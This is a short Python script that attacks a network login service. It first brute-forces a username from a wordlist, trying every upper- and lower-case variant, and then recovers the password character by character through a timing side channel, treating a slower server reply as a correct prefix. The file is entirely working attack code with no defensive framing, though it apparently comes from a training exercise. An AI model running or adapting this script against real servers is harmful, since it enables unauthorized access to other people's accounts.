#!/usr/bin/python3
"""
This script connects to a server using two systems

First: Use a dictionary attack to get the login information of the system

Second: Use a time base vulnerability, considering the server takes more
time right characters are found.

"""
import sys
import socket
import string
import itertools
import json
from datetime import datetime


ip_address = sys.argv[1]
port = int(sys.argv[2])
connection = socket.socket()
connection.connect((ip_address, port))
request_dict = {"login": "", "password": ""}
with open("hacking/resources/logins.txt") as login_list:
    """
    Opens list with common names register
    """
    for log_name in login_list:
        lu_sequence = ((c.lower(), c.upper()) for c in log_name.strip()) # Gets List with all upper and lower name possibilities
        for data in itertools.product(*lu_sequence):
            username = "".join(data) # Creates name in string format
            request_dict["login"] = username
            request_dict["password"] = " " # Test with normal password
            json_data = json.dumps(request_dict)
            connection.send(json_data.encode())
            server_response = connection.recv(1024)
            if "Wrong password!" == json.loads(server_response.decode())["result"]:
                break
        if "Wrong password!" == json.loads(server_response.decode())["result"]:
            break
    # Considers that username was found in the login
    letters = string.ascii_letters + string.digits
    i = 0
    my_password = ""
    while ("Connection success!" != json.loads(server_response.decode())["result"]):
        request_dict["password"] = my_password + letters[i]
        json_data = json.dumps(request_dict)
        start = datetime.now()
        connection.send(json_data.encode())
        server_response = connection.recv(1024)
        finish = datetime.now()
        difference = finish - start
        if (difference.microseconds >= 100000): # Time difference when a letter is part of the answer
            my_password = my_password + letters[i]
            i = 0
        else:
            i += 1
print(json.dumps(request_dict))
connection.close()
